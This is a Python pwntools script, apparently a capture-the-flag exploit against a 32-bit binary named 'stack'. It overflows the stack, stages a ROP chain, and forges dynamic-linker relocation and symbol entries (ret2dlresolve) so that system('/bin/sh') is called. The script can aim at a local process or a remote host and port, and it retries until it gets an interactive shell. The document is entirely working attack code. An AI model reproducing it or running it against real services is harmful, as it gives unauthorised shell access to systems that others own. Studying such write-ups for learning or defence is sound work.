#!/usr/bin/python
#__author__:TaQini

from pwn import *

# context.log_level = 'debug'
context.arch = 'i386'

local_file  = './stack'
local_libc  = '/lib/i386-linux-gnu/libc.so.6'
remote_libc = '/lib/i386-linux-gnu/libc.so.6'

def debug(cmd=''):
    gdb.attach(p,cmd)

def exp(p):
    elf = ELF(local_file)

    se      = lambda data               :p.send(data) 
    sa      = lambda delim,data         :p.sendafter(delim, data)
    sl      = lambda data               :p.sendline(data)
    sla     = lambda delim,data         :p.sendlineafter(delim, data)
    sea     = lambda delim,data         :p.sendafter(delim, data)
    rc      = lambda numb=4096          :p.recv(numb)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    uu32    = lambda data               :u32(data.ljust(4, '\0'))
    uu64    = lambda data               :u64(data.ljust(8, '\0'))
    info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

    # info
    stack_size = 0x800
    bss_addr = elf.bss()
    base_stage = bss_addr + stack_size

    # elf, libc
    gift = 0x0804A020
    read_plt = elf.symbols['read']
    main = elf.symbols['main']

    se('a'*0x14)
    payload2 = p32(read_plt) + p32(main) + p32(0) + p32(base_stage) + '\x78'

    # debug('b *0x8048448')
    se(payload2)
    # info_addr('tag',addr)
    # log.warning('--------------')

    cmd = '/bin/sh'
    plt_0 = 0x080482d0
    rel_plt = 0x08048298
    index_offset = base_stage+28 - rel_plt
    read_got = elf.got['read']
    dynsym = 0x080481cc
    dynstr = 0x0804821c
    fake_sym_addr = base_stage + 36
    align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
    fake_sym_addr = fake_sym_addr + align
    index_dynsym = (fake_sym_addr - dynsym) / 0x10
    r_info = (index_dynsym << 8) | 0x7
    fake_reloc = p32(read_got) + p32(r_info)
    st_name = (fake_sym_addr + 0x10) - dynstr
    fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

    pl3 = 'AAAA'
    pl3 += p32(plt_0)
    pl3 += p32(index_offset)
    pl3 += 'AAAA'
    pl3 += p32(base_stage + 80)
    pl3 += 'aaaa'
    pl3 += 'aaaa'
    pl3 += fake_reloc # (base_stage+28)
    pl3 += 'B' * align
    pl3 += fake_sym # (base_stage+36)
    pl3 += "system\x00"
    pl3 += 'A' * (80 - len(pl3))
    pl3 += cmd + '\x00'
    pl3 += 'A' * (100 - len(pl3))

    sleep(1)
    se(pl3)

    # rop2
    sleep(1)
    se('a'*0x14)
    pl4 = p32(0xdeadbeef)*4 + p32(base_stage+4+4)

    se(pl4)

    p.interactive()

while True:
    if len(sys.argv) == 1:
        p = process(local_file)
        libc = ELF(local_libc)
    elif len(sys.argv) > 1:
        host, port = sys.argv[1].split(':')
        if len(sys.argv) == 3:
            host = sys.argv[1]
            port = sys.argv[2]
        p = remote(host, port)
        libc = ELF(remote_libc)
    try:
        exp(p)
    except EOFError as e:
        p.close()
        log.warning('failed. restarting...')
    else:
        log.info('success')
        break
